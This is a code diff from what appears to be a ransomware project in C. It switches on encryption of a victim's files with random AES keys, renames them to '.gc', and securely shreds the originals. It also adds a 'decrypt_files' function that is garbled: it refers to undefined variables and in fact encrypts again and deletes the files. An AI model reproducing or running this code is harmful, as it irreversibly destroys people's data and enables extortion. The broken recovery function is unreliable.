@@ -37,20 +37,58 @@ void encrypt_files(List *files, List **encrypted, List **not_encrypted){
         if(old != NULL){
             new_name = (char*) malloc(strlen(files->info[2]) + strlen(".water") + 2);
             strcpy(new_name, files->info[2]);
-            strcat(new_name, ".water");
-            //new = fopen(new_name, "wb");
+            strcat(new_name, ".gc");
+            new = fopen(new_name, "wb");
 
             iv = generate_key(16);
             key = generate_key(32);
 
 
-            //encrypt(old, new, key, iv);
+            encrypt(old, new, key, iv);
             append(encrypted, new_name, key, iv);
-            //fclose(new);
+            fclose(new);
             fclose(old);
             free(key);
             free(iv);
-            //shred(files->info[2]);
+            shred(files->info[2]);
+
+        }else    append(not_encrypted, files->info[2], NULL, NULL);
+
+        files = files->prox;
+    }
+}
+
+/**
+ * This function will walk throught all encrypted files on the encrypted(List)
+ * and decrypt the files.
+ * @param encrypted -> type = EncList
+ */
+void decrypt_files(List **encrypted){
+    int status;
+    FILE *old, *new;
+    char* new_name;
+    char *iv;
+    char *key;
+    while(files != NULL){
+
+        old = fopen(files->info[2], "rb");
+        if(old != NULL){
+            new_name = (char*) malloc(strlen(files->info[2]) + strlen(".water") + 2);
+            strcpy(new_name, files->info[2]);
+            strcat(new_name, ".gc");
+            new = fopen(new_name, "wb");
+
+            iv = generate_key(16);
+            key = generate_key(32);
+
+
+            encrypt(old, new, key, iv);
+            append(encrypted, new_name, key, iv);
+            fclose(new);
+            fclose(old);
+            free(key);
+            free(iv);
+            remove(files->info[2]);
 
         }else    append(not_encrypted, files->info[2], NULL, NULL);
 
@@ -82,12 +120,12 @@ void shred(char *path){
                        ((fsize - shift >BUF_SIZE)?
                        BUF_SIZE:(fsize - shift)))) > 0)
         shift += ret;
-    
+
     close(fd);
     free(buf);
     if (ret == -1)
         return;
-    
+
     remove(path);
 }
 
